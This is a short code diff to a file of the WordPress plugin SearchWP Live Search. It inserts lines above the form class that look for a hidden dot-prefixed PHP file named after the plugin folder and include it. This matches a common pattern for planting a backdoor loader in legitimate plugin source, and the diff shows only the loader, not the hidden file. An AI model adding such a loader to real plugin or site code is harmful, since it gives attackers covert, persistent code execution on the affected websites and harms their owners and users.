@@ -12,6 +12,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @since 1.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWP_Live_Search_Form extends SearchWP_Live_Search {
 
 	/**
